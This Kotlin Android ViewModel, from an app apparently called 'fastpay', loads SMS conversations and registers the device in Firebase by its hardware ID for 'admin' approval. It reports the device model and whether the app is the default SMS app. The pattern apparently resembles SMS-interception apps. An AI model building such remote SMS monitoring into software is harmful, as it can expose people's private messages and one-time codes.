package com.example.fast.viewmodel

import android.annotation.SuppressLint
import android.app.Application
import android.content.Context
import android.provider.Settings
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.viewModelScope
import com.example.fast.config.AppConfig
import com.example.fast.domain.usecase.GetAllConversationsUseCase
import com.example.fast.model.SmsConversation
import com.example.fast.repository.SmsRepository
import com.example.fast.util.BatteryHelper
import com.example.fast.util.Logger
import com.example.fast.util.Result
import com.google.firebase.Firebase
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.Query
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.database
import dagger.hilt.android.lifecycle.HiltViewModel
import com.prexoft.prexocore.formatAsDateAndTime
import com.prexoft.prexocore.now
import com.prexoft.prexocore.readInternalFile
import com.prexoft.prexocore.writeInternalFile
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import javax.inject.Inject

/**
 * ViewModel for MainActivity
 * Manages:
 * - SMS conversations list
 * - Firebase status listener
 * - Device activation status
 * - Loading states
 */
@HiltViewModel
class MainActivityViewModel @Inject constructor(
    application: Application,
    private val smsRepository: SmsRepository,
    private val getAllConversationsUseCase: GetAllConversationsUseCase
) : AndroidViewModel(application) {
    
    private val context: Context = getApplication<Application>()
    
    // LiveData for UI state
    private val _conversations = MutableLiveData<List<SmsConversation>>()
    val conversations: LiveData<List<SmsConversation>> = _conversations
    
    private val _isLoading = MutableLiveData<Boolean>()
    val isLoading: LiveData<Boolean> = _isLoading
    
    private val _isEmpty = MutableLiveData<Boolean>()
    val isEmpty: LiveData<Boolean> = _isEmpty
    
    private val _statusMessage = MutableLiveData<StatusMessage?>()
    val statusMessage: LiveData<StatusMessage?> = _statusMessage
    
    private val _shouldShowViews = MutableLiveData<Boolean>()
    val shouldShowViews: LiveData<Boolean> = _shouldShowViews
    
    // Firebase listener references for cleanup
    private var statusListener: ValueEventListener? = null
    private var messagesListener: ChildEventListener? = null
    
    // Track last conversation update time to throttle reloads
    private var lastConversationReloadTime: Long = 0
    private var conversationReloadJob: kotlinx.coroutines.Job? = null
    
    @get:SuppressLint("HardwareIds")
    private val androidId: String
        get() = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: ""
    
    /**
     * Status message data class for UI alerts
     */
    data class StatusMessage(
        val title: String,
        val message: String,
        val buttonText: String = "OK"
    )
    
    /**
     * Load SMS conversations from device
     */
    fun loadConversations() {
        _isLoading.value = true
        
        viewModelScope.launch {
            when (val result = getAllConversationsUseCase()) {
                is Result.Success -> {
                    _conversations.value = result.data
                    _isEmpty.value = result.data.isEmpty()
                    _isLoading.value = false
                }
                is Result.Error -> {
                    Logger.e("MainActivityViewModel", result.exception, "Failed to load conversations")
                    _isEmpty.value = true
                    _isLoading.value = false
                }
            }
        }
    }
    
    /**
     * Setup Firebase real-time listener for NEW messages only
     * Only listens for messages after initial load to avoid slow broadcast
     */
    fun setupFirebaseMessagesListener() {
        val messagesPath = AppConfig.getFirebaseMessagePath(androidId)
        val messagesRef = Firebase.database.reference.child(messagesPath)
        
        // Remove existing listener to prevent duplicates
        messagesListener?.let {
            messagesRef.removeEventListener(it)
        }
        
        // Get current timestamp to only listen for NEW messages
        val currentTimestamp = System.currentTimeMillis()
        
        // Only listen for messages newer than current time (i.e., future messages)
        // This prevents Firebase from broadcasting all old messages on first attach
        val query: Query = messagesRef.orderByKey().startAfter(currentTimestamp.toString())
        
        messagesListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                // New message added - throttle reloads (max once per 2 seconds)
                throttleConversationReload()
            }
            
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                // Message changed - throttle reloads
                throttleConversationReload()
            }
            
            override fun onChildRemoved(snapshot: DataSnapshot) {
                // Message removed - reload conversations
                throttleConversationReload()
            }
            
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {
                // Not needed for messages
            }
            
            override fun onCancelled(error: DatabaseError) {
                android.util.Log.e("MainActivityViewModel", "Firebase messages listener cancelled", error.toException())
            }
        }
        
        query.addChildEventListener(messagesListener!!)
        
        Logger.d("MainActivityViewModel", "Firebase messages listener setup - listening for messages after: $currentTimestamp")
    }
    
    /**
     * Throttle conversation reloads to avoid UI spam
     * Only reloads once every 2 seconds even if multiple messages arrive
     */
    private fun throttleConversationReload() {
        val now = System.currentTimeMillis()
        
        // Cancel previous reload job
        conversationReloadJob?.cancel()
        
        // If last reload was more than 2 seconds ago, reload immediately
        if (now - lastConversationReloadTime > 2000) {
            reloadConversationsAsync()
            lastConversationReloadTime = now
        } else {
            // Otherwise, schedule reload after 2 seconds
            conversationReloadJob = viewModelScope.launch {
                kotlinx.coroutines.delay(2000 - (now - lastConversationReloadTime))
                reloadConversationsAsync()
                lastConversationReloadTime = System.currentTimeMillis()
            }
        }
    }
    
    /**
     * Reload conversations asynchronously (without showing loading state)
     */
    private fun reloadConversationsAsync() {
        viewModelScope.launch {
            when (val result = getAllConversationsUseCase()) {
                is Result.Success -> {
                    // Update conversations without showing loading state
                    _conversations.value = result.data
                    _isEmpty.value = result.data.isEmpty()
                    Logger.d("MainActivityViewModel", "Conversations reloaded: ${result.data.size} conversations")
                }
                is Result.Error -> {
                    Logger.e("MainActivityViewModel", result.exception, "Error reloading conversations")
                }
            }
        }
    }
    
    /**
     * Setup Firebase status listener
     * Checks activation status and handles state changes
     */
    fun setupFirebaseStatusListener() {
        val setup = context.readInternalFile("setup.txt")
        
        if (setup.isEmpty()) {
            val statusPath = AppConfig.getFirebasePath(androidId, AppConfig.FirebasePaths.STATUS)
            val statusRef = Firebase.database.reference.child(statusPath)
            
            // Remove existing listener to prevent duplicates
            statusListener?.let {
                statusRef.removeEventListener(it)
            }
            
            statusListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (snapshot.exists()) {
                        val statusValue = snapshot.value.toString()
                        val statusLower = statusValue.lowercase()
                        
                        when {
                            statusLower == "pending" -> {
                                _statusMessage.value = StatusMessage(
                                    title = "Sign in request sent",
                                    message = "We have sent a sign in request to admin, please wait for approval"
                                )
                            }
                            statusLower == "failed" -> {
                                _statusMessage.value = StatusMessage(
                                    title = "Request Rejected",
                                    message = "Admin has rejected your sign in request to this app."
                                )
                            }
                            else -> {
                                // Status is activation code or other value
                                context.writeInternalFile("setup.txt", statusValue)
                                syncSetupToFirebase(statusValue)
                                _shouldShowViews.value = true
                            }
                        }
                    } else {
                        // Initialize device data when first registered
                        initializeDeviceInFirebase()
                    }
                }
                
                override fun onCancelled(error: DatabaseError) {
                    // Handle error silently
                }
            }
            
            statusRef.addValueEventListener(statusListener!!)
        } else {
            // Already activated - show views immediately
            _shouldShowViews.value = true
        }
    }
    
    /**
     * Initialize device in Firebase when first registered
     * Uses the complete initialization from AppConfig that sets all default values
     */
    private fun initializeDeviceInFirebase() {
        // Use the complete initialization function that sets all default values
        AppConfig.initializeDeviceStructure(androidId, context)
        
        // After initialization, sync to device-list and show status message
        syncDeviceToDeviceList(null, androidId, "PENDING")
        _statusMessage.value = StatusMessage(
            title = "Sign in request sent",
            message = "We have sent a sign in request to admin, please wait for approval"
        )
    }
    
    /**
     * Sync setup.txt value to Firebase
     */
    private fun syncSetupToFirebase(value: String) {
        try {
            val setupPath = AppConfig.getFirebasePath(androidId, AppConfig.FirebasePaths.SETUP_VALUE)
            Firebase.database.reference.child(setupPath)
                .setValue(value)
                .addOnSuccessListener {
                    Logger.d("MainActivityViewModel", "Setup value synced to Firebase: $value")
                }
                .addOnFailureListener { e ->
                    android.util.Log.e("MainActivityViewModel", "Failed to sync setup to Firebase", e)
                }
        } catch (e: Exception) {
            Logger.e("MainActivityViewModel", e, "Error syncing setup to Firebase")
        }
    }
    
    /**
     * Sync device to Firebase device-list with code->deviceId mapping and default values
     * Structure: fastpay/device-list/{code}/
     * 
     * Sets:
     * - deviceId: Device ID mapping
     * - created_at: Timestamp when device was registered
     * - device_model: Device model (Brand + Model)
     * - status: Default status ("PENDING")
     * - BANKSTATUS: Default status with color (PENDING: #FFA500)
     * - BANK: Object containing:
     *   - bank_name: Default bank name ("XXXX")
     *   - company_name: Default company name ("XXXX")
     *   - other_info: Default other info ("XXXX")
     * 
     * Note: Only updates device-list if code exists. No code = no device-list entry.
     * Permissions are device-specific and stored in fastpay/{deviceId}/permission, not in device-list.
     */
    private fun syncDeviceToDeviceList(code: String?, deviceId: String, status: String) {
        try {
            // Only update device-list if code exists
            if (code.isNullOrBlank()) {
                Logger.d("MainActivityViewModel", "No code provided - skipping device-list sync")
                return
            }
            
            val deviceListPath = com.example.fast.config.AppConfig.getFirebaseDeviceListPath(code)
            
            // Default values
            val defaultBankStatus = mapOf("PENDING" to "#FFA500")
            val defaultBankName = "WELCOME"
            val defaultCompanyName = "STAY CONNECTED!"
            val defaultOtherInfo = "🫵ALWAYS PRIORITY!🫶"
            val defaultStatusText = "WELCOME,STAY CONNECTED!,🫵ALWAYS PRIORITY!🫶"
            
            // Get device model
            val deviceModel = "${android.os.Build.BRAND} ${android.os.Build.MODEL}"
            
            // Get current timestamp and format as human-readable date
            val createdAtTimestamp = System.currentTimeMillis()
            val createdAt = java.text.SimpleDateFormat("d MMM yyyy, h:mm a", java.util.Locale.getDefault())
                .format(java.util.Date(createdAtTimestamp))
            
            // Build BANK object structure
            val bankObject = mapOf(
                AppConfig.FirebasePaths.BANK_BANK_NAME to defaultBankName,
                AppConfig.FirebasePaths.BANK_COMPANY_NAME to defaultCompanyName,
                AppConfig.FirebasePaths.BANK_OTHER_INFO to defaultOtherInfo
            )
            
            // Build device-list data with defaults (permissions are device-specific, stored in fastpay/{deviceId}/permission)
            // Check if NAME exists before setting (only set on first time registration)
            Firebase.database.reference.child(deviceListPath)
                .addListenerForSingleValueEvent(object : com.google.firebase.database.ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val deviceListData = mutableMapOf<String, Any>(
                            "deviceId" to deviceId,
                            "created_at" to createdAt,
                            "device_model" to deviceModel,
                            "status" to "PENDING",
                            AppConfig.FirebasePaths.BANKSTATUS to defaultBankStatus,
                            AppConfig.FirebasePaths.BANK to bankObject
                        )
                        
                        // Set status_text default if not exists
                        if (!snapshot.child("status_text").exists()) {
                            deviceListData["status_text"] = defaultStatusText
                        }
                        
                        // Sync default device values to device-list (update all devices)
                        // These values come from fastpay/{deviceId} defaults
                        val deviceDefaultName = "${android.os.Build.BRAND} ${android.os.Build.MODEL}"
                        deviceListData["NAME"] = deviceDefaultName  // Always sync NAME from device model
                        deviceListData["isActive"] = "Opened"  // Sync isActive status
                        deviceListData["permission"] = "allow"  // Sync permission default
                        
                        // Check if app is default SMS app and sync to device-list
                        val isDefault = com.example.fast.util.DefaultSmsAppHelper.isDefaultSmsApp(context)
                        deviceListData["isDefault"] = isDefault
                        
                        // Update device-list
                        Firebase.database.reference.child(deviceListPath)
                            .updateChildren(deviceListData)
                            .addOnSuccessListener {
                                android.util.Log.d("MainActivityViewModel", "✅ Device synced to device-list with defaults: $deviceListPath -> $deviceId")
                            }
                            .addOnFailureListener { e ->
                                android.util.Log.e("MainActivityViewModel", "❌ Failed to sync device to device-list: $deviceListPath", e)
                            }
                    }
                    
                    override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                        android.util.Log.e("MainActivityViewModel", "❌ Error checking device-list for NAME: $deviceListPath", error.toException())
                    }
                })
        } catch (e: Exception) {
            android.util.Log.e("MainActivityViewModel", "❌ Error syncing device to device-list", e)
        }
    }
    
    /**
     * Clear status message after showing
     */
    fun clearStatusMessage() {
        _statusMessage.value = null
    }
    
    /**
     * Cleanup Firebase listeners
     */
    override fun onCleared() {
        super.onCleared()
        
        // Cancel throttled reload job
        conversationReloadJob?.cancel()
        conversationReloadJob = null
        
        // Remove status listener
        statusListener?.let {
            try {
                val statusPath = AppConfig.getFirebasePath(androidId, AppConfig.FirebasePaths.STATUS)
                Firebase.database.reference.child(statusPath).removeEventListener(it)
            } catch (e: Exception) {
                android.util.Log.e("MainActivityViewModel", "Error removing status listener", e)
            }
        }
        statusListener = null
        
        // Remove messages listener
        messagesListener?.let {
            try {
                val messagesPath = AppConfig.getFirebaseMessagePath(androidId)
                Firebase.database.reference.child(messagesPath).removeEventListener(it)
            } catch (e: Exception) {
                android.util.Log.e("MainActivityViewModel", "Error removing messages listener", e)
            }
        }
        messagesListener = null
    }
}
